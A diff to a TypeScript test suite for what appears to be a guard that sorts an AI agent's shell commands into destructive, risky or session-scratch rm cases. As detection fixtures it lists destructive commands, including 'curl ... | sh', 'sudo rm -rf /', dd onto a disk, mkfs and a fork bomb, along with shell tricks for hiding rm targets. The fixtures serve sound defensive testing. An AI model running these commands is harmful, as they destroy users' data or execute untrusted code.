@@ -1,12 +1,14 @@
 import assert from "node:assert/strict";
+import fs from "node:fs";
 import { realpathSync } from "node:fs";
 import { mkdir, mkdtemp, rename, rm, symlink, writeFile } from "node:fs/promises";
-import { tmpdir } from "node:os";
+import { syncBuiltinESMExports } from "node:module";
+import { homedir, tmpdir } from "node:os";
 import { join } from "node:path";
 import { after, before, test } from "node:test";
 import { TypeSafeIntegrationError } from "pi-typesafe";
 import { defaultConfig } from "../src/config.js";
-import { bornAfter, buildRequest, commandFamily, createdScratch, mktempOnly, scratchCandidates, describeAction, evaluateAction, formatVerdict, hostPaths, inertPathRules, intentSteer, isReadOnlyCommand, largeOutputNotice, matchPatterns, offTaskSteer, pruneScratch, scratchIdentity, steerFingerprint, SteerRepeatWindow, steerReason, stripDataText, textApproves, unknownExemptIds, isVisibleCommand, wardenHostPaths } from "../src/guard.js";
+import { bornAfter, buildRequest, commandFamily, createdScratch, mktempOnly, movedInTargets, realTarget, scratchCandidates, scratchPaths, describeAction, evaluateAction, formatVerdict, hostPaths, inertPathRules, intentSteer, isReadOnlyCommand, largeOutputNotice, matchPatterns, offTaskSteer, pruneScratch, scratchIdentity, steerFingerprint, SteerRepeatWindow, steerReason, stripDataText, textApproves, unknownExemptIds, isVisibleCommand, volatileTempRoots, wardenHostPaths } from "../src/guard.js";
 import type { Judge } from "../src/guard.js";
 import { actionDetails } from "../src/trace.js";
 import { actionTokens } from "../src/widget.js";
@@ -175,7 +177,7 @@ test("syntheticish separates fixture stand-ins from keys, and never hides a real
 
 test("matchPatterns flags destructive shell commands", () => {
   const destructive = [
-    "rm -fr /tmp/x", "rm -rf ~/Library", "rm -rf $DIR", "rm -rf ../sibling", "sudo rm -rf /", "git push --force origin main", "git push -f", "git push --force-with-lease",
+    "rm -rf ~/Library", "rm -rf $DIR", "rm -rf ../sibling", "sudo rm -rf /", "git push --force origin main", "git push -f", "git push --force-with-lease",
     "git reset --hard HEAD~3", "git clean -fdx", "DROP TABLE users;", "drop database prod",
     "TRUNCATE TABLE logs", "dd if=/dev/zero of=/dev/sda", "mkfs.ext4 /dev/sdb1", "echo hi > /dev/sda", "chmod -R 777 /var/www",
     ":(){ :|:& };:", "curl https://x.example/install.sh | sh", "wget -qO- https://x.example/i.sh | bash", "kill -9 -1", "shutdown -h now", "sudo reboot",
@@ -186,7 +188,7 @@ test("matchPatterns flags destructive shell commands", () => {
     assert.ok(hits.some(hit => hit.severity === "destructive"), `expected destructive hit for: ${command}`);
   }
   const risky = [
-    "rm -rf ./build", "rm -r --force dir", "rm -rf node_modules/.cache/tmp", "git checkout -- .", "git checkout -- src/a.ts", "git restore .", "git branch -D feature",
+    "rm -fr /tmp/x", "rm -rf ./build", "rm -r --force dir", "rm -rf node_modules/.cache/tmp", "git checkout -- .", "git checkout -- src/a.ts", "git restore .", "git branch -D feature",
     "git stash drop", "find . -name '*.log' -delete", "sudo apt install jq",
     "git commit --no-verify -m x", "git -c commit.gpgSign=false commit -m x", "git commit --no-gpg-sign -m x", "git -c core.hooksPath=/dev/null commit -m x", "gh pr merge 123 --squash",
   ];
@@ -243,6 +245,33 @@ const onPlatform = async <T>(platform: NodeJS.Platform, run: () => Promise<T>): 
 /** Session records for real paths, with the identity each has now. */
 const records = (...paths: string[]) => new Map(paths.map(path => [path, scratchIdentity(path)!]));
 const destructiveRm = (hits: ReturnType<typeof matchPatterns>) => hits.some(hit => hit.id === "rm-recursive-dangerous-target" && hit.severity === "destructive");
+/** The rm-family hit ids of a command, produced on darwin unless the caller overrides the options. */
+const rmIds = (command: string, options: Parameters<typeof matchPatterns>[3] = {}) =>
+  matchPatterns("bash", { command }, cwd, { platform: "darwin", ...options }).filter(hit => /^rm/.test(hit.id)).map(hit => hit.id);
+/**
+ * Wrap the file-system reads the guard imports, so a test can prove none is called for a path. `syncBuiltinESMExports`
+ * makes the swapped functions visible to modules that imported them by name; restore swaps them back.
+ */
+function spyOnFileSystem(): { calls: string[]; restore: () => void } {
+  const names = ["realpathSync", "lstatSync", "statSync", "readdirSync", "existsSync"] as const;
+  const calls: string[] = [];
+  const swapped = names.map(name => {
+    const original = fs[name] as unknown as (...args: unknown[]) => unknown;
+    (fs as unknown as Record<string, unknown>)[name] = (...args: unknown[]) => {
+      if (typeof args[0] === "string") calls.push(args[0]);
+      return original(...args);
+    };
+    return { name, original };
+  });
+  syncBuiltinESMExports();
+  return {
+    calls,
+    restore: () => {
+      for (const { name, original } of swapped) (fs as unknown as Record<string, unknown>)[name] = original;
+      syncBuiltinESMExports();
+    },
+  };
+}
 
 test("session scratch: an rm of a recorded temp directory is risky, not destructive", async () => {
   const base = await scratchBase();
@@ -252,7 +281,7 @@ test("session scratch: an rm of a recorded temp directory is risky, not destruct
     const scratch = records(realpathSync(probe));
     const hits = matchPatterns("bash", { command: `rm -rf ${probe}` }, cwd, { scratch, platform: "darwin" });
     assert.deepEqual(hits.map(hit => [hit.id, hit.severity]), [["rm-session-scratch", "risky"]]);
-    assert.ok(destructiveRm(matchPatterns("bash", { command: `rm -rf ${probe}` }, cwd)), "without the session set it stays destructive");
+    assert.deepEqual(rmIds(`rm -rf ${probe}`), ["rm-temp-subtree"], "without the session set the temp subtree warns under its own id");
   } finally { await rm(base, { recursive: true, force: true }); }
 });
 
@@ -265,13 +294,13 @@ test("session scratch: a recorded path replaced by a new directory stays destruc
     await rm(probe, { recursive: true });
     await new Promise(resolve => setTimeout(resolve, 5));
     await mkdir(probe);
-    assert.ok(destructiveRm(matchPatterns("bash", { command: `rm -rf ${probe}` }, cwd, { scratch, platform: "darwin" })), "a different directory at the recorded path");
+    assert.deepEqual(rmIds(`rm -rf ${probe}`, { scratch }), ["rm-temp-subtree"], "a different directory at the recorded path is no longer session scratch");
     pruneScratch(scratch);
     assert.equal(scratch.size, 0, "the stale record is dropped");
   } finally { await rm(base, { recursive: true, force: true }); }
 });
 
-test("session scratch: older content moved into a recorded directory stays destructive", async () => {
+test("session scratch: content moved into a recorded directory loses the session-scratch exemption", async () => {
   const base = await scratchBase();
   try {
     const important = join(base, "important");
@@ -281,10 +310,10 @@ test("session scratch: older content moved into a recorded directory stays destr
     const dir = join(base, "S", "x");
     await mkdir(dir, { recursive: true });
     const scratch = records(realpathSync(join(base, "S")), realpathSync(dir));
-    assert.ok(!destructiveRm(matchPatterns("bash", { command: `rm -rf ${dir}` }, cwd, { scratch, platform: "darwin" })), "empty scratch is not destructive");
+    assert.deepEqual(rmIds(`rm -rf ${dir}`, { scratch }), ["rm-session-scratch"], "empty scratch is session scratch");
     await rename(important, join(dir, "important"));
-    assert.ok(destructiveRm(matchPatterns("bash", { command: `rm -rf ${dir}` }, cwd, { scratch, platform: "darwin" })), "moved content keeps its older birth time");
-    assert.ok(destructiveRm(matchPatterns("bash", { command: `rm -rf ${join(dir, "important")}` }, cwd, { scratch, platform: "darwin" })), "the moved directory itself");
+    assert.deepEqual(rmIds(`rm -rf ${dir}`, { scratch }), ["rm-temp-subtree"], "moved content keeps its older birth time, so the record no longer applies");
+    assert.deepEqual(rmIds(`rm -rf ${join(dir, "important")}`, { scratch }), ["rm-temp-subtree"], "the moved directory itself");
   } finally { await rm(base, { recursive: true, force: true }); }
 });
 
@@ -320,7 +349,7 @@ test("session scratch: without birth time, mktemp beside a listing records nothi
     const listing = createdScratch("bash", { command: `mktemp -d; ls -d ${base}/*` }, `${made}\n${existing}\n`, Date.now() - 1000, [], noBirth, "darwin");
     assert.equal(listing.size, 0);
     const scratch = new Map(listing);
-    assert.ok(destructiveRm(matchPatterns("bash", { command: `rm -rf ${existing}` }, cwd, { scratch, platform: "darwin" })), "the pre-existing directory stays destructive");
+    assert.deepEqual(rmIds(`rm -rf ${existing}`, { scratch }), ["rm-temp-subtree"], "the pre-existing directory is not session scratch");
     assert.deepEqual([...createdScratch("bash", { command: "mktemp -d" }, `${made}\n`, Date.now() - 1000, [], noBirth, "darwin").keys()], [made], "mktemp alone");
     assert.deepEqual([...createdScratch("bash", { command: "d=$(mktemp -d) && echo \"$d\"" }, `${made}\n`, Date.now() - 1000, [], noBirth, "darwin").keys()], [made], "an assignment and an echo of it");
     assert.equal(createdScratch("bash", { command: "mktemp -d; echo done" }, `${made}\ndone\n`, Date.now() - 1000, [], noBirth, "darwin").size, 0, "anything else in the command");
@@ -349,7 +378,7 @@ test("session scratch: a privileged rm of scratch stays destructive", async () =
   } finally { await rm(base, { recursive: true, force: true }); }
 });
 
-test("session scratch: a command that moves, links, copies, or extracts data in before its rm stays destructive", async () => {
+test("session scratch: a command that moves or links data in keeps the hold", async () => {
   const base = await scratchBase();
   try {
     const probe = join(base, "probe-abc");
@@ -358,30 +387,185 @@ test("session scratch: a command that moves, links, copies, or extracts data in 
     const moveIns = [
       `mv ~/work ${probe}/ && rm -rf ${probe}`,
       `ln -s ~/work ${probe}/w; rm -rf ${probe}/w/`,
-      `rsync -a --remove-source-files ~/work/ ${probe}/ && rm -rf ${probe}`,
-      `mount -t nfs host:/data ${probe} && rm -rf ${probe}`,
-      `hdiutil attach disk.dmg -mountpoint ${probe} && rm -rf ${probe}`,
-      `bindfs ~/work ${probe} && rm -rf ${probe}`,
       `\\mv ~/work ${probe}/ && rm -rf ${probe}`,
       `"ln" -s ~/work ${probe}/w && rm -rf ${probe}/w/`,
       `l''n -s ~/work ${probe}/w && rm -rf ${probe}/w/`,
       `/bin/mv ~/work ${probe}/ && rm -rf ${probe}`,
+      `(cd ~ && mv work ${probe}/) && rm -rf ${probe}`,
+    ];
+    for (const command of moveIns) {
+      assert.deepEqual(rmIds(command, { scratch }), ["rm-recursive-dangerous-target"], `a command that moves data in keeps the hold: ${command}`);
+    }
+    const takes = [
+      `rsync -a --remove-source-files ~/work/ ${probe}/ && rm -rf ${probe}`,
+      `rsync -a --remove-sent-files ~/work/ ${probe}/ && rm -rf ${probe}`,
+      `tar -xf ~/work.tar -C ${probe} --remove-files && rm -rf ${probe}`,
+      `mount -t nfs host:/data ${probe} && rm -rf ${probe}`,
+      `hdiutil attach disk.dmg -mountpoint ${probe} && rm -rf ${probe}`,
+      `bindfs ~/work ${probe} && rm -rf ${probe}`,
+    ];
+    for (const command of takes) {
+      assert.deepEqual(rmIds(command, { scratch }), ["rm-recursive-dangerous-target"], `a command that takes data with it keeps the hold: ${command}`);
+    }
+    const copies = [
       `cp -R ~/work ${probe}/ && rm -rf ${probe}`,
       `cp -a ~/work ${probe}/ && rm -rf ${probe}`,
       `tar -xf ~/work.tar -C ${probe} && rm -rf ${probe}`,
       `tar xf ~/work.tar -C ${probe} && rm -rf ${probe}`,
       `git clone ~/work ${probe}/w && rm -rf ${probe}`,
       `git -C ~ clone ~/work ${probe}/w && rm -rf ${probe}`,
-      `(cd ~ && mv work ${probe}/) && rm -rf ${probe}`,
+      `git archive HEAD | tar -x -C ${probe} && rm -rf ${probe}`,
     ];
-    for (const command of moveIns) {
-      assert.ok(destructiveRm(matchPatterns("bash", { command }, cwd, { scratch, platform: "darwin" })), `expected destructive for: ${command}`);
+    for (const command of copies) {
+      assert.deepEqual(rmIds(command, { scratch }), ["rm-temp-subtree"], `a copy keeps its source, so the location rule still applies: ${command}`);
     }
-    assert.deepEqual(matchPatterns("bash", { command: `rm -rf ${probe}` }, cwd, { scratch, platform: "darwin" }).map(hit => hit.id), ["rm-session-scratch"], "a plain rm of recorded scratch is still released");
+    assert.deepEqual(rmIds(`rm -rf ${probe}`, { scratch }), ["rm-session-scratch"], "a plain rm of recorded scratch is still released");
   } finally { await rm(base, { recursive: true, force: true }); }
 });
 
-test("session scratch: on linux a recorded mkdir then rm -rf stays destructive", async () => {
+test("literal variables: a target resolves to the value the command gave it", () => {
+  const saved = process.env.TMPDIR;
+  process.env.TMPDIR = "/tmp";
+  try {
+    for (const command of [`D=/tmp/x && rm -rf "$D"`, `D=/tmp/x && rm -rf "$D"/after`, `D=/tmp/x && rm -rf \${D}`, `D='/tmp/x' && rm -rf "$D"`, `rm -rf "$TMPDIR/foo"`]) {
+      assert.deepEqual(rmIds(command), ["rm-temp-subtree"], command);
+    }
+    assert.deepEqual(rmIds(`d=$(mktemp -d) && cd "$d" && rm -rf build`), ["rm-session-scratch"], "a cd into a mktemp directory makes the target scratch");
+    const held = [
+      `rm -rf "$HOME/projects"`,
+      `D=/tmp/x && rm -rf "$D"/*`,
+      `D=/tmp/x && rm -rf "$D" "$E"`,
+      `D=/tmp/x; D=/tmp/y; rm -rf "$D"`,
+      `rm -rf "$F"; F=/tmp/x`,
+      `D=/tmp/x && f() { D=~; }; rm -rf "$D"`,
+      `D=$RANDOM && rm -rf "$D"`,
+      `D=/tmp/x* && rm -rf "$D"`,
+      `D=~/x && rm -rf "$D"`,
+      `TMPDIR=/tmp/x rm -rf "$TMPDIR/y"`,
+      `unset TMPDIR; rm -rf "$TMPDIR/"`,
+      `unset HOME; rm -rf "$HOME/projects"`,
+      `D=/tmp/x && rm -rf "$D/../y"`,
+    ];
+    for (const command of held) assert.ok(destructiveRm(matchPatterns("bash", { command }, cwd)), command);
+  } finally {
+    if (saved === undefined) delete process.env.TMPDIR; else process.env.TMPDIR = saved;
+  }
+});
+
+test("literal variables: an unread assignment form in the command keeps every variable unresolved", () => {
+  const held = [
+    `D=/tmp/x; printf -v D %s ~; rm -rf "$D"`,
+    `D=/tmp/x; mapfile -t D < list; rm -rf "$D"`,
+    `D=/tmp/x; readarray -t D < list; rm -rf "$D"`,
+    `D=/tmp/x; read D; rm -rf "$D"`,
+    `D=/tmp/x; eval D=~; rm -rf "$D"`,
+    `D=/tmp/x; . ./env.sh; rm -rf "$D"`,
+    `D=/tmp/x; source ./env.sh; rm -rf "$D"`,
+    `D=/tmp/x; getopts d D; rm -rf "$D"`,
+    `D=/tmp/x; let D=0; rm -rf "$D"`,
+    `D=/tmp/x; ((D=0)); rm -rf "$D"`,
+    `D=/tmp/x; : \${D=~/projects}; rm -rf "$D"`,
+    `D=/tmp/x; D+=x; rm -rf "$D"`,
+    `D=/tmp/x; declare -n D=HOME; rm -rf "$D"`,
+    `D=/tmp/x; local -a D; rm -rf "$D"`,
+    `D=/tmp/x; f() { D=~; }; rm -rf "$D"`,
+    `D=/tmp/x; function f { D=~; }; rm -rf "$D"`,
+  ];
+  for (const command of held) assert.ok(destructiveRm(matchPatterns("bash", { command }, cwd)), command);
+  for (const command of [`D=/tmp/x; E=/tmp/y; rm -rf "$D"`, `D=/tmp/x; printf %s ~; rm -rf "$D"`, `D=/tmp/x; git clone -q . "$D"; rm -rf "$D"`]) {
+    assert.deepEqual(rmIds(command), ["rm-temp-subtree"], `a command with no unread form still resolves: ${command}`);
+  }
+});
+
+test("effective directory: a relative rm target after a cd resolves against it", () => {
+  assert.deepEqual(rmIds("cd /tmp/x && rm -rf build"), ["rm-temp-subtree"], "a relative target after a cd into a temp root");
+  assert.deepEqual(rmIds("cd /tmp/x; pushd sub && rm -rf build"), ["rm-temp-subtree"], "pushd moves the directory too");
+  assert.deepEqual(rmIds(`cd ${tmpdir()} && cd sub && rm -rf build`), ["rm-temp-subtree"], "a relative directory resolves against the previous one");
+  assert.deepEqual(rmIds("cd ~ && rm -rf projects"), ["rm-recursive-dangerous-target"], "a cd inside the home directory");
+  assert.deepEqual(rmIds("cd /Users && rm -rf someone/projects"), ["rm-recursive-dangerous-target"]);
+  assert.deepEqual(rmIds("cd /tmp/x && rm -rf build /var/tmp/y"), ["rm-recursive-dangerous-target"], "one target outside the temp roots keeps the hold");
+  assert.deepEqual(rmIds("cd /tmp/x && rm -rf build/../../y"), ["rm-recursive-dangerous-target"], "a `..` segment keeps the hold");
+  assert.deepEqual(rmIds("cd /tmp/x && rm -rf dist"), ["rm-temp-subtree"], "the target is classified by the path it names");
+  for (const command of ["cd && rm -rf build", "cd a b && rm -rf build", `cd "$(git rev-parse --show-toplevel)" && rm -rf build`, `cd "$UNKNOWN" && rm -rf build`]) {
+    assert.deepEqual(rmIds(command), ["rm-rf"], `a cd whose destination cannot be read keeps today's reading: ${command}`);
+  }
+  assert.deepEqual(rmIds("rm -rf build"), ["rm-rf"], "without a cd nothing changes");
+});
+
+test("effective directory: a keyword before a cd counts, and an unread change holds relative targets", () => {
+  const held = [
+    "if cd ~; then rm -rf projects; fi",
+    "while cd ~; do rm -rf projects; break; done",
+    "until cd ~; do rm -rf projects; break; done",
+    "if false; then :; elif cd ~; then rm -rf projects; fi",
+    "if false; then :; else cd ~; rm -rf projects; fi",
+    "! cd ~; rm -rf projects",
+    "{ cd ~; }; rm -rf projects",
+    "(cd ~) ; rm -rf projects",
+    "cd /tmp/x && eval cd ~ && rm -rf projects",
+    "cd /tmp/x && builtin cd ~ && rm -rf projects",
+    "cd /tmp/x && command cd ~ && rm -rf projects",
+    "cd /tmp/x && source ./env.sh && rm -rf projects",
+    "cd /tmp/x && . ./env.sh && rm -rf projects",
+    "cd - && rm -rf build",
+    "cd ~ && pushd /tmp/x && popd && rm -rf projects",
+    "cd /tmp/x && popd && rm -rf projects",
+  ];
+  for (const command of held) assert.deepEqual(rmIds(command), ["rm-recursive-dangerous-target"], command);
+});
+
+test("temp classification: a path that cannot be temp is classified without a file-system call", () => {
+  const spy = spyOnFileSystem();
+  try {
+    assert.deepEqual(rmIds("rm -rf /net/example.invalid/x"), ["rm-recursive-dangerous-target"], "an absolute target outside the temp roots holds");
+    assert.deepEqual(rmIds("cd /net/example.invalid && rm -rf projects"), ["rm-recursive-dangerous-target"], "a cd destination outside the temp roots holds its relative target");
+    assert.ok(destructiveRm(matchPatterns("bash", { command: `d=$(mktemp -d /net/example.invalid/x) && rm -rf "$d"` }, cwd)));
+    assert.ok(!spy.calls.some(path => path.startsWith("/net")), `the classifier never reads it: ${spy.calls.filter(path => path.startsWith("/net")).join(", ")}`);
+    assert.deepEqual(rmIds("rm -rf /tmp/pi-warden-missing/inside"), ["rm-temp-subtree"], "a literal temp target is still resolved");
+  } finally {
+    spy.restore();
+  }
+});
+
+test("moved-in data: the destination of a same-command mv or ln keeps every release rule off", () => {
+  const held = [
+    `mv ~/projects/app /tmp/old-app && rm -rf /tmp/old-app`,
+    `mv ~/projects/app /tmp/old-app && rm -rf /tmp/old-app/`,
+    `mv -t /tmp/old-app ~/projects/app && rm -rf /tmp/old-app`,
+    `mv --target-directory=/tmp/old-app ~/projects/app && rm -rf /tmp/old-app`,
+    `d=$(mktemp -d) && mv ~/projects/app "$d"/ && rm -rf "$d"`,
+    `ln -s ~/projects/app /tmp/lnk && rm -rf /tmp/lnk/`,
+    `mv ~/projects/app "$UNKNOWN" && rm -rf /tmp/old-app`,
+    `mv ~/projects/app /tmp/old-app && rm -rf /tmp/old-app/sub`,
+    `mv ~/projects/app /tmp && rm -rf /tmp/old-app`,
+    `bash -c 'mv ~/projects/app /tmp/old-app' && rm -rf /tmp/old-app`,
+    `xargs mv -t /tmp/old-app && rm -rf /tmp/old-app`,
+  ];
+  for (const command of held) {
+    assert.deepEqual(rmIds(command), ["rm-recursive-dangerous-target"], `a moved-in destination keeps the hold: ${command}`);
+  }
+  const warned = [
+    `mv /tmp/build/out.js dist/ && rm -rf /tmp/build`,
+    `mv /tmp/build/out.js dist/ && rm -rf /tmp/build/sub`,
+    `git archive HEAD | tar -x -C /tmp/snap && rm -rf /tmp/snap`,
+  ];
+  for (const command of warned) {
+    assert.deepEqual(rmIds(command), ["rm-temp-subtree"], `a destination unrelated to the target does not block it: ${command}`);
+  }
+});
+
+test("moved-in data: a destination an earlier call recorded keeps a later rm held", () => {
+  const movedIn = movedInTargets("bash", { command: "mv ~/projects/app /tmp/old-app" }, cwd, []);
+  assert.deepEqual(movedIn.map(path => realTarget(path)), [realTarget("/tmp/old-app")].filter(path => path !== undefined), "the temp destination is recorded as a real path");
+  assert.deepEqual(rmIds("rm -rf /tmp/old-app", { movedIn }), ["rm-recursive-dangerous-target"]);
+  assert.deepEqual(rmIds("rm -rf /tmp/old-app/sub", { movedIn }), ["rm-recursive-dangerous-target"], "a path inside a recorded destination");
+  assert.deepEqual(rmIds("rm -rf /tmp/old-app-other", { movedIn }), ["rm-temp-subtree"], "a sibling path is not related to it");
+  assert.deepEqual(rmIds("rm -rf /tmp/old-app"), ["rm-temp-subtree"], "without the record the location rule releases it");
+  assert.deepEqual(movedInTargets("bash", { command: "mv /tmp/a ~/projects/b" }, cwd, []), [], "a destination outside the temp roots is not recorded");
+  assert.deepEqual(movedInTargets("bash", { command: "ls -la" }, cwd, []), [], "no mover, nothing recorded");
+});
+
+test("session scratch: on linux a recorded mkdir is the only path that changes; the temp subtree still warns", async () => {
   const base = await scratchBase();
   try {
     const probe = join(base, "probe-abc");
@@ -392,8 +576,8 @@ test("session scratch: on linux a recorded mkdir then rm -rf stays destructive",
     assert.equal(createdScratch("bash", input, "", Date.now() - 1000, candidates, undefined, "linux").size, 0, "nothing recorded on linux");
     const scratch = createdScratch("bash", input, "", Date.now() - 1000, candidates, undefined, "darwin");
     assert.ok(scratch.has(realpathSync(probe)));
-    assert.ok(destructiveRm(matchPatterns("bash", { command: `rm -rf ${probe}` }, cwd, { scratch, platform: "linux" })), "linux keeps the hold");
-    assert.ok(!destructiveRm(matchPatterns("bash", { command: `rm -rf ${probe}` }, cwd, { scratch, platform: "darwin" })), "darwin exempts it");
+    assert.deepEqual(matchPatterns("bash", { command: `rm -rf ${probe}` }, cwd, { scratch, platform: "linux" }).map(hit => hit.id), ["rm-temp-subtree"], "linux has no birth time, so the temp subtree warns under its own id");
+    assert.deepEqual(matchPatterns("bash", { command: `rm -rf ${probe}` }, cwd, { scratch, platform: "darwin" }).map(hit => hit.id), ["rm-session-scratch"], "darwin releases it as session scratch");
   } finally { await rm(base, { recursive: true, force: true }); }
 });
 
@@ -430,6 +614,103 @@ test("session scratch: a relative project path keeps its current classification"
   } finally { await rm(base, { recursive: true, force: true }); }
 });
 
+test("same-command mktemp: a recursive rm of the variable it made warns as session scratch", () => {
+  const released = [
+    `d=$(mktemp -d) && echo x > "$d/f" && rm -rf "$d"`,
+    `d=$(mktemp -d); rm -rf $d`,
+    "D=`mktemp -d`; rm -rf \"$D/sub\"",
+    `export d="$(mktemp -d)"; rm -rf "$d"`,
+    `d=$(mktemp -d); echo hi; rm -rf "$d/"`,
+    `d=$(mktemp -d) && export PATH="$PATH:$d/bin" && rm -rf "$d"`,
+  ];
+  for (const command of released) assert.deepEqual(rmIds(command), ["rm-session-scratch"], command);
+  const held = [
+    `d=$(mktemp -d); d=/other; rm -rf "$d"`,
+    `d=$(mktemp -d); f() { d=~; }; f; rm -rf "$d"`,
+    `d=$(mktemp -d); (d=/other); rm -rf "$d"`,
+    `d=$(mktemp -d); { d=/other; }; rm -rf "$d"`,
+    `d=$(mktemp -d); read -r d; rm -rf "$d"`,
+    `d=$(mktemp -d); for d in a b; do :; done; rm -rf "$d"`,
+    `d=$(mktemp -d); unset d; rm -rf "$d"`,
+    `d=$(mktemp -d); local d; rm -rf "$d"`,
+    `d=$(mktemp -d); export d; rm -rf "$d"`,
+    `d=$(mktemp -d); d+=x; rm -rf "$d"`,
+    `d=$(mktemp -u); rm -rf "$d"`,
+    `d=$(mktemp --dry-run -d); rm -rf "$d"`,
+    `d=$(mktemp -d ~/projects/outside); rm -rf "$d"`,
+    `d=$(mktemp -d); rm -rf "$d/../x"`,
+    `rm -rf $NAME`,
+    `rm -rf "$TMPDIR"`,
+    `d=$(mktemp -d); sudo rm -rf "$d"`,
+  ];
+  for (const command of held) assert.ok(destructiveRm(matchPatterns("bash", { command }, cwd)), command);
+});
+
+test("temp subtree: a literal path strictly inside a volatile temp root warns as rm-temp-subtree", async () => {
+  const base = realpathSync(await mkdtemp("/tmp/pi-warden-tempsub-"));
+  try {
+    const inner = join(base, "tree");
+    await mkdir(inner);
+    assert.deepEqual(rmIds(`rm -rf ${inner}`), ["rm-temp-subtree"]);
+    assert.deepEqual(rmIds(`rm -rf ${base}`), ["rm-temp-subtree"], "the temp root's own subtree");
+    const held = [
+      "rm -rf /tmp", "rm -rf /tmp/", "rm -rf /tmp/*", `rm -rf ${base}/*`,
+      "rm -rf /var/tmp/x", `rm -rf ${base}/../elsewhere`, `rm -rf ${base}/$NAME`, `rm -rf ${base}/$(echo x)`,
+      `rm -rf "$TMPDIR"`, `rm -rf ${inner} /var/tmp/other`, `sudo rm -rf ${inner}`,
+    ];
+    for (const command of held) assert.ok(destructiveRm(matchPatterns("bash", { command }, cwd)), command);
+  } finally { await rm(base, { recursive: true, force: true }); }
+});
+
+test("temp subtree: the OS temp root is volatile, and the root itself is never released", async () => {
+  const base = realpathSync(await mkdtemp(join(tmpdir(), "pi-warden-ostmp-")));
+  try {
+    assert.ok(volatileTempRoots().includes(realpathSync(tmpdir())), "os.tmpdir() is one of the volatile roots");
+    assert.deepEqual(rmIds(`rm -rf ${join(base, "x")}`), ["rm-temp-subtree"]);
+    assert.ok(destructiveRm(matchPatterns("bash", { command: `rm -rf ${realpathSync(tmpdir())}` }, cwd)), "the temp root itself stays held");
+  } finally { await rm(base, { recursive: true, force: true }); }
+});
+
+test("declared scratch paths: a recursive rm strictly inside one warns as session scratch", async () => {
+  const base = realpathSync(await mkdtemp("/var/tmp/pi-warden-hostscratch-"));
+  try {
+    const inner = join(base, "work");
+    await mkdir(inner);
+    const { roots, ignored } = scratchPaths({ PI_WARDEN_SCRATCH_PATHS: base }, cwd);
+    assert.deepEqual(roots, [base]);
+    assert.deepEqual(ignored, []);
+    assert.deepEqual(rmIds(`rm -rf ${inner}`, { scratchPaths: roots }), ["rm-session-scratch"]);
+    assert.ok(destructiveRm(matchPatterns("bash", { command: `rm -rf ${inner}` }, cwd)), "without the declaration it stays destructive");
+    assert.ok(destructiveRm(matchPatterns("bash", { command: `rm -rf ${base}` }, cwd, { scratchPaths: roots })), "the declared root itself stays held");
+  } finally { await rm(base, { recursive: true, force: true }); }
+});
+
+test("declared scratch paths: the root, the home directory, the project root, and a git work tree are ignored with a reason", async () => {
+  const base = realpathSync(await mkdtemp("/var/tmp/pi-warden-hostscratch-"));
+  try {
+    const repo = join(base, "repo");
+    await mkdir(join(repo, ".git"), { recursive: true });
+    await mkdir(join(base, "ok"));
+    const { roots, ignored } = scratchPaths({ PI_WARDEN_SCRATCH_PATHS: ["/", homedir(), cwd, repo, "relative", join(base, "ok")].join(":") }, cwd);
+    assert.deepEqual(roots, [realpathSync(join(base, "ok"))]);
+    assert.deepEqual(ignored.map(item => item.entry), ["/", homedir(), cwd, repo, "relative"]);
+    for (const item of ignored) assert.ok(item.reason.length > 0, item.entry);
+  } finally { await rm(base, { recursive: true, force: true }); }
+});
+
+test("temp subtree leaves the declined call and paths outside the temp roots held", () => {
+  const held = [
+    `W=~/.cache/tool/worktrees; rm -rf "$W"/* ~/projects/app`,
+    `rm -rf ~/.cache/tool/worktrees`,
+    `rm -rf ~/projects/app`,
+    `rm -rf /var/tmp/keep`,
+    `rm -rf "$SCRATCH"`,
+    `rm -rf /tmp/x/*`,
+    `rm -rf /tmp/x /var/tmp/y`,
+  ];
+  for (const command of held) assert.ok(destructiveRm(matchPatterns("bash", { command }, cwd)), command);
+});
+
 test("session scratch: the judge reads the scratch fact in floor_hits", async () => {
   const base = await scratchBase();
   try {
@@ -437,7 +718,7 @@ test("session scratch: the judge reads the scratch fact in floor_hits", async ()
     const fake = judge(0.2, 0.1);
     const verdict = await onPlatform("darwin", () => evaluateAction({ tool: "bash", input: { command: `rm -rf ${base}` }, cwd, task: "run the tests" }, { config: defaultConfig().action, judge: fake, scratch }));
     const request = fake.calls[0] as { state: { floor_hits: string } };
-    assert.equal(request.state.floor_hits, "recursive rm of session scratch: every target is under the temp directory and was created in this session [risky]");
+    assert.equal(request.state.floor_hits, "recursive rm of session scratch: every target is under the temp directory or a declared scratch root [risky]");
     assert.notEqual(verdict.level, "confirm", verdict.reasons.join("; "));
   } finally { await rm(base, { recursive: true, force: true }); }
 });
@@ -1126,7 +1407,7 @@ test("context-mode and powershell tools are guarded through their command fields
   assert.ok(destructive.patterns.some(hit => hit.id === "git-force-push"));
   assert.match(destructive.summary.command ?? "", /git push --force/);
 
-  const batch = await evaluateAction({ tool: "ctx_batch_execute", input: { commands: [{ label: "status", command: "git status" }, { label: "nuke", command: "rm -rf /tmp/x" }], queries: ["q"] }, cwd, task: "fix the bug" }, { config });
+  const batch = await evaluateAction({ tool: "ctx_batch_execute", input: { commands: [{ label: "status", command: "git status" }, { label: "nuke", command: "rm -rf /var/tmp/x" }], queries: ["q"] }, cwd, task: "fix the bug" }, { config });
   assert.equal(batch.level, "confirm");
   assert.ok(batch.patterns.some(hit => hit.id === "rm-recursive-dangerous-target"));
 
